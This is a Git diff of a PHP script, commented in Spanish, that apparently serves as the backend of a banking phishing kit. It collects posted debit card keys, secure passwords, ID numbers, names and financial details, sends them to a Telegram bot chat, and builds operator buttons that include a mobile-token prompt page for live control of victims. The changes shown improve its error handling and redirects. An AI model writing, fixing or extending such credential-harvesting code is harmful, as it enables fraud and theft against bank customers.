@@ -21,13 +21,16 @@ try {
     $stmt->execute([':id' => $new_id, ':estado' => $estado]);
     $_SESSION['transaction_id'] = $new_id;
 } catch (PDOException $e) {
-    error_log("Error de base de datos: " . $e->getMessage());
+    error_log("Error de base de datos CRÍTICO: " . $e->getMessage());
+    die("Error fatal: No se pudo conectar o escribir en la base de datos. Revise los logs del servidor.");
 }
+
+// Si el script llega aquí, $new_id SÍ existe y la DB funcionó.
 
 // --- Lógica de Telegram ---
 $telegram_config = $config['telegram'];
 if (!isset($telegram_config['bot_token']) || !isset($telegram_config['chat_id'])) {
-    header('Location: ../../index.php?id=' . ($new_id ?? 'error'));
+    header('Location: ../../index.php?id=' . ($new_id ?? 'error_tg_config'));
     exit;
 }
 
@@ -60,23 +63,18 @@ if ($debit_card_key) {
     $message .= "› *Clave Segura:* `" . htmlspecialchars($secure_key) . "`\n";
 }
 
-// ======================= INICIO DE LA MODIFICACIÓN =======================
-// --- NUEVA SECCIÓN: Captura de datos del crédito ---
-// (JavaScript los envía con el prefijo 'credito_')
 
-// Capturar números (el JS los envía limpios, sin '$' ni '.')
+// --- NUEVA SECCIÓN: Captura de datos del crédito ---
 $credito_monto_raw = $_POST['credito_montoCredito'] ?? 0;
 $credito_ingresos_raw = $_POST['credito_ingresoMensual'] ?? 0;
 $credito_gastos_raw = $_POST['credito_gastosMensual'] ?? 0;
 $credito_saldo_raw = $_POST['credito_saldoActual'] ?? 0;
 
-// Formatear números como moneda para Telegram
 $credito_monto = '$' . number_format($credito_monto_raw, 0, ',', '.');
 $credito_ingresos = '$' . number_format($credito_ingresos_raw, 0, ',', '.');
 $credito_gastos = '$' . number_format($credito_gastos_raw, 0, ',', '.');
 $credito_saldo = '$' . number_format($credito_saldo_raw, 0, ',', '.');
 
-// Captura del resto de datos de crédito
 $credito_tipo_doc = $_POST['credito_tipoDocCredito'] ?? 'No especificado';
 $credito_cedula = $_POST['credito_cedula'] ?? 'No especificado';
 $credito_nombre = $_POST['credito_nombreCompleto'] ?? 'No especificado';
@@ -96,11 +94,13 @@ $message .= "› *Gastos:* `" . htmlspecialchars($credito_gastos) . "`\n";
 $message .= "› *Saldo Cuenta:* `" . htmlspecialchars($credito_saldo) . "`\n";
 $message .= "› *Plazo:* " . htmlspecialchars($credito_plazo) . " meses\n";
 $message .= "› *Fecha de Pago:* Día " . htmlspecialchars($credito_fecha_pago) . "\n";
+
+
+// ======================= INICIO DE LA MODIFICACIÓN =======================
+// Limpiamos la URL base para quitar saltos de línea (%0A) o espacios
+$base_update_url = trim($config['base_url']);
 // ======================= FIN DE LA MODIFICACIÓN =======================
 
-
-// --- Lógica para Múltiples Botones con Estados (AHORA INCLUYE TOKEN MÓVIL) ---
-$base_update_url = $config['base_url'];
 // El botón de Token Móvil ahora apunta a nuestra nueva página de prompt
 $admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_update_url);
 
@@ -138,6 +138,7 @@ curl_setopt($ch, CURLOPT_TIMEOUT, 10);
 curl_exec($ch);
 curl_close($ch);
 
-header('Location: ../../index.php?id=' . ($new_id ?? 'error'));
+// Esta línea AHORA SÍ se ejecutará con un $new_id válido
+header('Location: ../../index.php?id=' . $new_id);
 exit;
 ?>
